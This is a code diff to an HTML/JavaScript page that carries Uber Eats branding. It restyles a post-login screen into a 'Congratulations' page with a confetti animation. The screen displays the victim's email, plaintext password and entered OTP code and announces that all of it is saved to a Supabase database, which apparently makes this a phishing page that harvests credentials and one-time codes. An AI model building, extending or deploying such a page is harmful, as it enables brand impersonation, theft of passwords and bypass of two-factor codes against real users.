@@ -144,38 +144,54 @@
   </div>
 </div>
 
-<!-- DASHBOARD -->
+<!-- CONGRATULATIONS PAGE -->
 <div class="dash" id="dash">
-  <div class="dash-av">
-    <svg width="38" height="38" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-      <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>
+  <canvas id="confetti" style="position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:998;"></canvas>
+
+  <div style="width:110px;height:110px;background:linear-gradient(135deg,#2e7d32,#66bb6a);border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:20px;box-shadow:0 8px 32px rgba(46,125,50,0.35);">
+    <svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+      <polyline points="20 6 9 17 4 12"/>
     </svg>
   </div>
-  <h2 id="dName">Welcome!</h2>
-  <p>Signed in to Uber Eats</p>
-  <div class="badge">&#10003; Saved to Supabase Database</div>
-  <div class="grid">
-    <div class="card full">
-      <label>Email Address</label>
-      <p id="dEmail">-</p>
+
+  <div style="font-size:14px;font-weight:700;letter-spacing:3px;color:#f57c00;text-transform:uppercase;margin-bottom:8px;">Uber Eats</div>
+  <h2 style="font-size:34px;font-weight:800;margin-bottom:6px;">Congratulations!</h2>
+  <p id="dName" style="font-size:17px;font-weight:600;color:#1976d2;margin-bottom:6px;">-</p>
+  <p style="font-size:14px;color:var(--g600);margin-bottom:20px;">Your account has been verified successfully</p>
+
+  <div style="display:inline-flex;align-items:center;gap:8px;background:#e8f5e9;color:#2e7d32;font-size:13px;font-weight:700;padding:10px 22px;border-radius:100px;margin-bottom:30px;">
+    ✅ All Data Saved to Supabase Database
+  </div>
+
+  <div style="width:100%;display:flex;flex-direction:column;gap:12px;margin-bottom:30px;">
+
+    <div style="background:#e3f2fd;border-radius:14px;padding:18px 20px;text-align:left;border-left:5px solid #1976d2;">
+      <div style="font-size:11px;color:#1565c0;text-transform:uppercase;letter-spacing:.8px;font-weight:700;">Email Address</div>
+      <div id="dEmail" style="font-size:17px;font-weight:700;margin-top:6px;color:#0d47a1;word-break:break-all;">-</div>
     </div>
-    <div class="card full">
-      <label>Password</label>
-      <p id="dPass" style="color:#1976d2;">-</p>
+
+    <div style="background:#f3e5f5;border-radius:14px;padding:18px 20px;text-align:left;border-left:5px solid #7b1fa2;">
+      <div style="font-size:11px;color:#6a1b9a;text-transform:uppercase;letter-spacing:.8px;font-weight:700;">Password</div>
+      <div id="dPass" style="font-size:17px;font-weight:700;margin-top:6px;color:#4a148c;">-</div>
     </div>
-    <div class="card full">
-      <label>OTP Code Entered</label>
-      <p id="dOtp" style="color:var(--green);font-size:22px;letter-spacing:6px;">-</p>
+
+    <div style="background:#fff8e1;border-radius:14px;padding:18px 20px;text-align:left;border-left:5px solid #f57c00;">
+      <div style="font-size:11px;color:#e65100;text-transform:uppercase;letter-spacing:.8px;font-weight:700;">OTP Code Verified</div>
+      <div id="dOtp" style="font-size:32px;font-weight:800;margin-top:6px;color:#e65100;letter-spacing:12px;">-</div>
     </div>
-    <div class="card">
-      <label>Status</label>
-      <p style="color:var(--green);">Verified ✅</p>
-    </div>
-    <div class="card">
-      <label>Login Time</label>
-      <p id="dTime">-</p>
+
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
+      <div style="background:#e8f5e9;border-radius:14px;padding:16px 18px;text-align:left;">
+        <div style="font-size:11px;color:#1b5e20;text-transform:uppercase;letter-spacing:.6px;font-weight:700;">Status</div>
+        <div style="font-size:15px;font-weight:700;margin-top:6px;color:#2e7d32;">Verified ✅</div>
+      </div>
+      <div style="background:var(--g100);border-radius:14px;padding:16px 18px;text-align:left;">
+        <div style="font-size:11px;color:var(--g600);text-transform:uppercase;letter-spacing:.6px;font-weight:700;">Login Time</div>
+        <div id="dTime" style="font-size:12px;font-weight:600;margin-top:6px;">-</div>
+      </div>
     </div>
   </div>
+
   <button class="btn-out" onclick="doLogout()">Sign Out</button>
 </div>
 
@@ -324,12 +340,54 @@ function showDash() {
   document.getElementById('dName').textContent  = 'Welcome, ' + G_EMAIL.split('@')[0] + '!';
   document.getElementById('dEmail').textContent = G_EMAIL;
   document.getElementById('dPass').textContent  = G_PW;
-  document.getElementById('dOtp').textContent   = G_OTP;
+  document.getElementById('dOtp').textContent   = G_OTP.split('').join(' ');
   document.getElementById('dTime').textContent  = new Date().toLocaleString();
 
   document.querySelectorAll('.screen').forEach(function(s){ s.classList.remove('active'); });
   document.getElementById('dash').classList.add('active');
-  showT('Email + Password + OTP saved to database!', 'success');
+  showT('Congratulations! All data saved to database!', 'success');
+  startConfetti();
+}
+
+function startConfetti() {
+  var canvas = document.getElementById('confetti');
+  if (!canvas) return;
+  var ctx = canvas.getContext('2d');
+  canvas.width  = window.innerWidth;
+  canvas.height = window.innerHeight;
+  var pieces = [];
+  var colors = ['#1976d2','#2e7d32','#f57c00','#d32f2f','#7b1fa2','#000','#FFD700'];
+  for (var i = 0; i < 160; i++) {
+    pieces.push({
+      x: Math.random() * canvas.width,
+      y: Math.random() * canvas.height - canvas.height,
+      w: Math.random() * 12 + 6,
+      h: Math.random() * 6 + 4,
+      color: colors[Math.floor(Math.random() * colors.length)],
+      speed: Math.random() * 4 + 2,
+      angle: Math.random() * 360,
+      spin:  Math.random() * 6 - 3
+    });
+  }
+  var frame = 0;
+  function draw() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    pieces.forEach(function(p) {
+      ctx.save();
+      ctx.translate(p.x, p.y);
+      ctx.rotate(p.angle * Math.PI / 180);
+      ctx.fillStyle = p.color;
+      ctx.fillRect(-p.w/2, -p.h/2, p.w, p.h);
+      ctx.restore();
+      p.y += p.speed;
+      p.angle += p.spin;
+      if (p.y > canvas.height) { p.y = -20; p.x = Math.random() * canvas.width; }
+    });
+    frame++;
+    if (frame < 300) requestAnimationFrame(draw);
+    else ctx.clearRect(0, 0, canvas.width, canvas.height);
+  }
+  draw();
 }
 
 function doLogout() {
